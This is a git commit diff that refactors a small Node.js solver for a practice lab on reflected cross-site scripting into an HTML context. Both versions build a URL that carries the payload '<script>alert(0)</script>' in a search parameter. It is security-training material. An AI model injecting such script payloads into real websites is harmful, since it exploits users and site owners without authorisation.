9e3e3e807bcf5ca710bdd2f8fd2648599ed91d89
Denis <denis@example.com>
2023-09-18 00:19:21 +0300

    refactor xss lab

--- src/labs/xss/reflected_xss_into_html_context_with_nothing_encoded/app.js
+++ src/labs/xss/reflected_xss_into_html_context_with_nothing_encoded/app.js
@@ -4,6 +4,8 @@ const { url } = getParsedInput({
   description: "Lab: Reflected XSS into HTML context with nothing encoded",
 });
 
-const payload = "?search=<script>alert(0)</script>";
-console.log(`Just visit this url to solve the lab:
-"${url}${payload}"`);
+const searchParam = "?search=";
+const payload = "<script>alert(0)</script>";
+console.log(`
+Just visit this url to solve the lab:
+  "${url}${searchParam}${payload}"`);
